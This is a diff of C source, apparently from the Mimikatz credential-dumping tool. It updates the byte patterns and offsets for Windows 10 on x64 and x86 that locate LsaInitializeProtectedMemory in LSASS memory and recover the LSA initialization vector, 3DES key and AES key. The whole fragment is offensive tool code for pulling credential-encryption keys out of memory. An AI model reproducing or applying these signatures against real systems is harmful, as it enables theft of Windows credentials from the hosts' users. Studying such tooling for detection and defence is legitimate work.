@@ -8,13 +8,12 @@
 #ifdef _M_X64
 BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d};
 BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d};
-BYTE PTRN_WN10b_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15};
+BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15};
 KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // InitializationVector, h3DesKey, hAesKey
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {63, -69, 25}},
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),	PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {59, -61, 25}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
-	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {58, -66, 23}},
-	{KULL_M_WIN_BUILD_10b,		{sizeof(PTRN_WN10b_LsaInitializeProtectedMemory_KEY),	PTRN_WN10b_LsaInitializeProtectedMemory_KEY},{0, NULL}, {61, -73, 16}},
+	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY},{0, NULL}, {61, -73, 16}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_LsaInitializeProtectedMemory_KEY[]	= {0x6a, 0x02, 0x6a, 0x10, 0x68};
@@ -22,7 +21,7 @@ KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // Init
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -76, -21}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -69, -18}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}}, // post 11/11
-	{KULL_M_WIN_BUILD_10b,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}},
+	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY),	PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}},
 };
 
 #endif
